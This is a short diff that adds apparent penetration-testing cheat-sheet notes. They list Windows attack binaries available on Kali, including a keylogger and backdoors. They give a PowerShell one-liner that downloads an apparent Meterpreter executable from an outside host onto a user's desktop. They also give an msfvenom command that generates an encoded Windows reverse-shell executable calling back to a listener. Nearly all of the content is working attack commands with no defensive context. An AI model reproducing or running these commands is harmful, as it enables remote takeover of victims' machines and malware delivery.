@@ -1,0 +1,14 @@
+Linux like tools that can be used on Windows:
+/usr/share/windows-binaries
+
+examples include
+klogger.exe
+whoami.exe
+wget.exe
+backdoors
+
+PowerShell's WebClient object:
+> powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.9.122.8/met8888.exe','C:\Users\jarrieta\Desktop\met8888.exe')"
+
+
+root@kali:~# msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=172.16.104.130 LPORT=31337 -b "\x00" -e x86/shikata_ga_nai -f exe -o /tmp/1.exe
